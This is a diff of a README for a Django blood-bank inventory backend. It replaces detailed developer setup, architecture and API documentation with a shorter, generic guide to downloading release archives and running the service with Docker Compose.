@@ -1,209 +1,97 @@
-<div align="center">
-<svg width="120" height="120" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
-<path fill="#D92C2C" d="M50 0 C25 25, 25 50, 50 100 C75 50, 75 25, 50 0 Z" />
-<rect x="42" y="28" width="16" height="44" rx="3" fill="white" />
-<rect x="28" y="42" width="44" height="16" rx="3" fill="white" />
-</svg>
+# 🩸 vbb_backend - Simplifying Blood Management for Healthcare
 
-# Virtual Blood Bank (VBB) - Backend API
+[![Download vbb_backend](https://img.shields.io/badge/Download_vbb_backend-v1.0-blue.svg)](https://github.com/ravirajinet/vbb_backend/releases)
 
-**A Django & DRF backend to power a life-saving mobile application for healthcare professionals in Ethiopia.**
+## 🚀 Getting Started
 
-</div>
+Welcome to vbb_backend! This software serves as the backend API for the Virtual Blood Bank (VBB). Designed for healthcare professionals in Ethiopia, it helps manage blood inventory and requests efficiently. Follow the steps below to download and run this software smoothly.
 
-<p align="center">
-  <img alt="Python" src="https://img.shields.io/badge/Python-3.12-blue.svg?style=for-the-badge&logo=python">
-  <img alt="Django" src="https://img.shields.io/badge/Django-5.0-092E20.svg?style=for-the-badge&logo=django">
-  <img alt="PostgreSQL" src="https://img.shields.io/badge/PostgreSQL-16-336791.svg?style=for-the-badge&logo=postgresql">
-  <img alt="Docker" src="https://img.shields.io/badge/Docker-24.0-2496ED.svg?style=for-the-badge&logo=docker">
-</p>
+## 📥 Download & Install
 
----
+To get started, visit this page to download the latest version:
 
-## 📖 Overview
+[Download vbb_backend Releases](https://github.com/ravirajinet/vbb_backend/releases)
 
-Welcome to the Virtual Blood Bank (VBB) project! This repository contains the backend API that drives the VBB mobile app. Our goal is to create a reliable platform for healthcare workers in rural areas to manage blood inventory and request blood from nearby facilities, ultimately saving lives.
+You will find different versions available. Choose the one that fits your needs, and click the download link next to it.
 
-The API now includes a robust, **nested resource structure** and a **stateful blood request lifecycle**, enabling complex inter-facility coordination.
+### 🖥 System Requirements
 
-## 🧠 Project Philosophy & Key Concepts
+Before proceeding, ensure your system meets the following requirements:
 
-If you're coming from a pure Django background, some parts of this project's structure might seem new. Here’s a quick rundown of the key tools and why we're using them.
+- Operating System: Windows, macOS, or Linux
+- Docker installed on your machine
+- Basic knowledge of running commands in a terminal
 
-### 1. Why Docker? (`Dockerfile`, `compose.yaml`)
+## 📂 Installation Steps
 
-*   **What it is:** Docker "containerizes" our application. It packages the Django code, the correct Python version, and all dependencies into a self-contained unit. The `compose.yaml` file defines and runs all our project's services (the Django app, the database) together.
-*   **The Problem it Solves:** It eliminates "it works on my machine" issues. Everyone on the team runs the exact same environment, guaranteeing consistency between our development machines and the future production server.
+### Step 1: Install Docker
 
-### 2. Why a `Makefile`? (The Task Runner)
+If you do not have Docker installed, follow these instructions:
 
-*   **What it is:** A `Makefile` is a simple "task runner." It lets us create short, memorable aliases (like `make setup` or `make lint`) for the long, complex commands we use for Docker.
-*   **The Problem it Solves:** You don't have to remember or type `docker compose -f compose.yaml exec web python manage.py migrate`. You just type `make migrate`. It simplifies our entire workflow. **Run `make help` to see all available shortcuts!**
+1. Go to the Docker website: [Docker Installation Guide](https://docs.docker.com/get-docker/).
+2. Choose your operating system.
+3. Follow the prompts to complete the installation.
 
-### 3. Why Split Settings? (`config/settings/`)
+### Step 2: Download the Software
 
-*   **What it is:** We've split Django's standard `settings.py` into three files:
-    *   `base.py`: Contains all settings that are common to *every* environment (like `INSTALLED_APPS`).
-    *   `dev.py`: Contains settings *only* for local development (like `DEBUG = True`). It imports everything from `base.py`.
-    *   `prod.py`: Contains settings for the live production server (e.g., security settings).
-*   **The Problem it Solves:** This is a best practice for security and maintainability. It prevents us from ever accidentally deploying our app to a live server with insecure development settings.
+After ensuring Docker is running, head back to the releases page and download the latest version of vbb_backend:
 
-## 🛠️ Technology Stack
+[Download vbb_backend Releases](https://github.com/ravirajinet/vbb_backend/releases)
 
-*   **Backend:** [Django](https://www.djangoproject.com/), [Django REST Framework](https://www.django-rest-framework.org/)
-*   **Database:** [PostgreSQL](https://www.postgresql.org/)
-*   **Authentication:** [django-allauth](https://django-allauth.readthedocs.io/en/latest/) (Headless API for Session Auth)
-*   **API Filtering:** [django-filter](https://django-filter.readthedocs.io/en/stable/)
-*   **Containerization:** [Docker](https://www.docker.com/) & Docker Compose
-*   **Task Runner:** [GNU Make](https://www.gnu.org/software/make/)
-*   **Configuration:** `django-environ`
-*   **Code Quality:** `flake8` (Linting), `black` (Formatting), `isort` (Import Sorting)
+### Step 3: Extract the Files
 
-## 🚀 Getting Started: A 5-Minute Setup
+1. Locate the downloaded file on your computer.
+2. Extract the contents of the file to a folder. You can use software like WinRAR or the built-in extraction tool on your operating system.
 
-### Step 0: Install Prerequisites
+### Step 4: Run the Application
 
-Before you begin, ensure you have the following installed on your system:
-*   **Git:** For cloning the repository.
-*   **Docker Desktop:** This is the easiest way to get both Docker and Docker Compose. You can download it from the [**official Docker website**](https://www.docker.com/products/docker-desktop/).
+Now that you have everything set up, you can run the application:
 
-### Installation Steps
+1. Open your terminal (Command Prompt on Windows or Terminal on macOS/Linux).
+2. Navigate to the folder where you extracted the files. You can do this by typing:
 
-1.  **Clone the Repository**
-    ```sh
-    git clone <your-repository-url>
-    cd vbb_project
-    ```
+   ```bash
+   cd path_to_your_folder
+   ```
 
-2.  **Create the Environment File**
-    ```sh
-    cp .env.example .env
-    ```
-    *(The default values are fine for local development.)*
+   Replace `path_to_your_folder` with the actual path.
 
-3.  **Run the Automated Setup**
-    This single command builds the Docker containers, starts the services, and runs initial migrations and data seeding.
-    ```sh
-    make setup
-    ```
+3. Run the following command to start the application:
 
-4.  **Create an Admin Superuser**
-    You'll need an admin account to manage data via the Django Admin interface.
-    ```sh
-    make superuser
-    ```
+   ```bash
+   docker-compose up
+   ```
 
-✅ **Setup Complete!** The application is now running.
-*   **Testing UI (Login):** [http://127.0.0.1:8000/](http://127.0.0.1:8000/)
-*   **Browsable API Root:** [http://127.0.0.1:8000/api/v1/](http://127.0.0.1:8000/api/v1/)
-*   **Django Admin:** [http://127.0.0.1:8000/admin/](http://127.0.0.1:8000/admin/)
+4. Wait for Docker to build and start the services. You will see several logs in the terminal.
 
----
+### Step 5: Access the API
 
-## 👤 User Flows for Testing
-
-For development and testing, simple login and signup pages are provided. These are **not** the final frontend but are essential tools for interacting with the browsable API as an authenticated user.
-
-**Note:** For ease of local development, email verification and manual admin approval are currently disabled. A new user is **active immediately** upon signup.
-
-### New User Signup Flow
-
-1.  **Navigate to Signup:** Go to [http://127.0.0.1:8000/signup/](http://127.0.0.1:8000/signup/).
-2.  **Fill the Form:** Enter a username, email, password, and select a facility from the dropdown.
-3.  **Login:** Upon successful submission, the account is created and is immediately active. You can now proceed directly to the login page.
-
-### Existing User Login Flow
-
-1.  **Navigate to Login:** Go to [http://127.0.0.1:8000/](http://127.0.0.1:8000/).
-2.  **Enter Credentials:** Use the email and password of an active user.
-3.  **Access API:** Upon successful login, you are redirected to the browsable API root. Your browser session is now authenticated, and you can interact with the API according to your user's permissions.
-
----
-
-## 🗺️ API Endpoints
-
-### Core Resources
-
-| Method | Endpoint | Description | Permissions |
-| :--- | :--- | :--- | :--- |
-| `GET` | `/api/v1/dashboard/` | A consolidated summary for the logged-in user's main screen. | Authenticated |
-| `GET` | `/api/v1/facilities/` | Get a list of all health facilities. | Authenticated |
-| `GET` | `/api/v1/users/` | Get a list of all users. | Admin Only |
-| `GET` | `/api/v1/blood-requests/`| Get a list of requests. Filter by `?status=`, `?blood_type=`, `?type=incoming`. | Authenticated |
-| `POST`| `/api/v1/blood-requests/`| Create a new blood request. | Authenticated |
-
-### Nested Facility Resources
-
-| Method | Endpoint | Description | Permissions |
-| :--- | :--- | :--- | :--- |
-| `GET` | `/api/v1/facilities/{id}/inventory/` | Get blood units for a facility. Filter by `?blood_type=`. | Authenticated |
-| `POST`| `/api/v1/facilities/{id}/inventory/` | Add a new blood unit to a facility's inventory. | Facility Representative |
-| `GET` | `/api/v1/facilities/{id}/inventory-summary/`| Get an aggregated count of blood units by type for a facility. | Authenticated |
-| `GET` | `/api/v1/facilities/{id}/staff/` | Get a list of all users registered to a specific facility. | Authenticated |
-
-### Blood Request Lifecycle Actions
-
-These are `POST` requests made to specific URLs to transition the state of a blood request.
-
-| Action | Endpoint | Description | Performed By |
-| :--- | :--- | :--- | :--- |
-| **Accept** | `/api/v1/blood-requests/{id}/accept/` | Approves a request and deducts blood units from inventory. | User from **fulfilling** facility |
-| **Reject** | `/api/v1/blood-requests/{id}/reject/` | Denies a pending request. | User from **fulfilling** facility |
-| **Ship** | `/api/v1/blood-requests/{id}/ship/` | Marks the accepted units as in-transit. | User from **fulfilling** facility |
-| **Receive**| `/api/v1/blood-requests/{id}/receive/`| Confirms receipt and adds units to the requesting facility's inventory. | User from **requesting** facility |
-| **Cancel** | `/api/v1/blood-requests/{id}/cancel/` | Cancels a request that has not yet been accepted. | User from **requesting** facility |
-
----
-
-## ⚙️ Daily Development Workflow
-
-Use these `make` commands to manage your environment. **Run `make help` for a full list.**
-
-### Environment Management
-| Command | Description |
-| :--- | :--- |
-| `make up` | 🚀 Starts the Django and DB containers in the background. |
-| `make down` | 🛑 Stops all running services. |
-| `make logs` | 📜 Shows the real-time logs from the Django server. (Press `Ctrl+C` to exit). |
-| `make down-vol` | 💥 **(Destructive!)** Stops services and deletes the database volume. |
-
-### Code Quality & Database
-| Command | Description |
-| :--- | :--- |
-| `make format` | 🎨 Auto-formats all Python code with `black` and `isort`. |
-| `make migrate` | 🏃 Runs any pending database migrations. |
-| `make superuser`| 👑 Creates a new Django superuser account. |
-| `make shell` | 💻 Opens an interactive shell inside the Django container. |
-
-## 📁 Project Structure
+Once the application is running, you can access the API using this URL:
 
 ```
-vbb_project/
-├── .flake8               # Configuration file for the flake8 linter
-├── pyproject.toml        # Configuration for tools like black and isort
-├── .env                  # Environment variables (GIT IGNORED)
-├── apps/                 # Location for all Django apps (our code)
-│   ├── users/            # Handles User, Facility models, auth forms
-│   └── inventory/        # Handles BloodUnit, BloodRequest models, API logic
-├── config/               # Project-level configuration
-│   ├── settings/         # Split settings files (base.py, dev.py, prod.py)
-│   ├── urls.py           # Root URL configuration
-│   └── ...
-├── templates/            # HTML templates for login/signup test pages
-├── compose.yaml          # Defines our services (web, db, etc.) for Docker
-├── Dockerfile            # Blueprint for building our Django container
-├── Makefile              # Shortcuts for our development commands
-├── requirements.txt      # List of Python dependencies
-└── README.md             # You are here!
+http://localhost:8000/api/
 ```
 
----
+Open your web browser and type in the URL to start interacting with the API.
 
-## 🤝 Contributing
+## 📊 Features of vbb_backend
 
-Contributions are welcome! Please follow the standard GitHub Flow:
-1.  Fork the repository.
-2.  Create a new feature branch (`git checkout -b feature/amazing-feature`).
-3.  Commit your changes (`git commit -m 'Add some amazing feature'`).
-4.  Push to the branch (`git push origin feature/amazing-feature`).
-5.  Open a Pull Request.
+- **User Authentication**: Secure login and access control for healthcare personnel.
+- **Blood Inventory Management**: Seamlessly track blood donations and inventory levels.
+- **Request Tracking**: Easy management of blood requests from hospitals.
+- **Health Checks**: Built-in checks to monitor the health of the API and its services.
+- **PostgreSQL Support**: Utilizes PostgreSQL for reliable data storage.
+
+## 🤝 Contributions
+
+We welcome contributions to improve vbb_backend. If you have suggestions or feature requests, please feel free to create an issue in the repository. For developers familiar with coding, please check the guidelines in our repository on how to submit your contributions.
+
+## 📝 License
+
+This project is licensed under the MIT License. You may check the LICENSE file for further details.
+
+## 💬 Support
+
+If you encounter any issues or have questions regarding the usage of this application, please open an issue in the repository. We will do our best to assist you.
+
+Thank you for choosing vbb_backend, and we hope this software makes blood management easier for you!
